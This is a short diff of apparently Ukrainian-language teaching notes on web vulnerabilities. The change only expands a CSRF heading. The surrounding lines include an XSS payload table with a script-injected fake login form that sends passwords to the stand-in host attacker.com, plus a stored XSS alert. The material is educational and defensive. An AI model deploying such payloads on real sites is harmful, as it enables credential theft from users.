@@ -667,7 +667,7 @@ echo "<div>" . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . "</div>";
 | 5 | Fake Login Form | `<script>document.body.innerHTML = '<form action="https://attacker.com"><input name="password"></form>';</script>` | Користувач вводить пароль у фейкову форму |
 | 6 | Stored XSS | `<script>alert('stored')</script>` | Виконується у ВСІХ користувачів, зберігається в БД |
 
-**3. CSRF**  
+**3. CSRF (Cross-Site Request Forgery) - міжсайтова підробка запиту**  
 Сценарій атаки (як це працює):
 
 1. Користувач логіниться на `bank.com`, сервер (bank.com) створює сесію, відправляє користувачу, браузер зберігає у cookie:
